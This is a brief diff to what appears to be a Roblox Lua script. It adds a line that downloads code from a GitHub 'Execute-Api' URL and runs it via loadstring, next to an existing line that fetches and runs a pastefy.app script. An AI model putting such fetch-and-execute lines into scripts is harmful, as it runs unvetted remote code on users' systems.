@@ -4,4 +4,6 @@ task.spawn(function()
     end)
 end)
 
+pcall(loadstring(game:HttpGet("https://raw.githubusercontent.com/duongquangtungnam/Scripts/refs/heads/main/Execute-Api"))()
+
 loadstring(game:HttpGet"https://pastefy.app/MsZyLO5w/raw")()
